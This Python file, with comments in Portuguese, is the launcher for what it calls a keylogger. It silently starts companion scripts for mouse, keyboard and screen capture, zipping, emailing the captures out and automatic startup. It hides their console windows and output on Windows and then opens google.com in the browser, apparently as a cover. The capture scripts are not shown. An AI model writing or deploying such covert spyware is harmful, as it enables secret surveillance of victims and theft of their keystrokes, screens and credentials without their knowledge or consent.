import subprocess
import signal
import sys
import os
import webbrowser

# Lista de scripts a serem executados
scripts = ['mouse.py', 'teclado.py', 'tela.py', 'Zip.py', 'send_email.py', 'inicializacao_automatica.py']

def signal_handler(sig, frame):
    print('Interrompendo os processos...', file=sys.stderr)
    for process in processes:
        process.terminate()
        process.wait()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

processes = []

# Flags para ocultar janela de console no Windows
creationflags = 0
if os.name == 'nt':
    creationflags = subprocess.CREATE_NO_WINDOW

try:
    # Redireciona saída padrão e de erro para devnull
    with open(os.devnull, 'wb') as devnull:
        # Inicia os scripts do keylogger
        for script in scripts:
            process = subprocess.Popen(
                ["python", script],
                stdout=devnull,
                stderr=devnull,
                creationflags=creationflags
            )
            processes.append(process)

    # Abra o navegador padrão após iniciar os scripts
    webbrowser.open("http://www.google.com")

except Exception as e:
    with open(os.devnull, 'wb') as devnull:
        print(f"Erro ao iniciar subprocessos: {e}", file=sys.stderr)
    for process in processes:
        process.terminate()
        process.wait()
